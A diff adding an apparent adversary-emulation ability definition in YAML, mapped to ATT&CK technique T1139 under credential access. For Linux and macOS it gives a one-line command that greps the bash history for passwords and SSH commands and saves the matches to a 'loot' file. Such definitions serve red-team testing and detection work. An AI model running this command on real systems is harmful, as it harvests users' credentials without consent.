@@ -1,0 +1,18 @@
+---
+
+- id: taccrede-1139-AR00-1v00-200120184608
+  name: Search Through Bash History
+  description: .      Search through bash history for specifice commands we want to capture
+  tactic: credential-access
+  technique:
+    attack_id: T1139
+    name: Bash History
+  platforms:
+    linux:
+      sh:
+        command: |
+          cat ~/.bash_history | grep  -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
+    darwin:
+      sh:
+        command: |
+          cat ~/.bash_history | grep  -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
